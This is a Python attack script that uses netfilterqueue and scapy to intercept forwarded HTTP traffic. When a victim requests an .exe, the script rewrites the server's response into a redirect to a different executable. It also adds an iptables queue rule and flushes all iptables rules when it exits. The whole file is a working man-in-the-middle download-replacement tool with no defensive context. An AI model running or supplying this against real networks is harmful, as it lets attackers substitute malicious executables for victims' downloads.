#! usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import os

os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
ack_list = []
load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP]:
            if scapy_packet[scapy.TCP].dport == 80:
                print ("\n\n[+] HTTP Request >>\n\n")
                if ".exe" in scapy_packet[scapy.Raw].load:
                    print("\n\n[+] .exe Request found.\n\n")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())

            elif scapy_packet[scapy.TCP].sport == 80:
                print ("\n\n[+] HTTP Response >>\n\n")
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("\n\n[+] Replacing file\n\n")
                    modified_packet = set_load(scapy_packet, load)
                    packet.set_payload(str(modified_packet))
                    print(scapy_packet.show())

            # print(scapy_packet.show())
        else:
            print("[-] No TCP Layer")
            print(scapy_packet.show())
        packet.accept()


def set_load(packet, payload):
    packet[scapy.Raw].load = payload
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    return packet


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print("\n\n[+] CTRL + C detected, cleaning up and exiting.\n\n")
    os.system("iptables --flush")
